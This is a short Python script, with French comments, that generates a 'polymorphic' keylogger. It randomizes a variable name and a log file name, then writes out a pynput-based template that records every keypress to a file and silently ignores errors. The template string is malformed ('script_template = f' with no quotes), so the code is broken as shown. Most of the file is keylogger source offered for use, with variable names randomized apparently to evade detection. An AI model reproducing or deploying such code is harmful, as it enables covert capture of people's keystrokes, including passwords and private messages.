import random
import string   
try:
    print("Test du try")
except Exception as e:
    print(f"Erreur : {e}")
finally:
    print("ça passe")    

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

#Générer des noms aléatoires pour les variables
keylogger_name = random_string()
log_file = random_string() + ".txt"

script_template = f
from pynput import keyboard

{keylogger_name} = "{log_file}"

def on_press(key):
    try:
        with open({keylogger_name}, "a") as file:
            file.write(str(key) + "\n")
    except:
        pass

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


#Sauvegarde du script polymorphe
with open("polymorphic_keylogger.py", "w", encoding="utf-8") as f:
    f.write(script_template)

print(f"Keylogger polymorphe généré -> polymorphic_keylogger.py")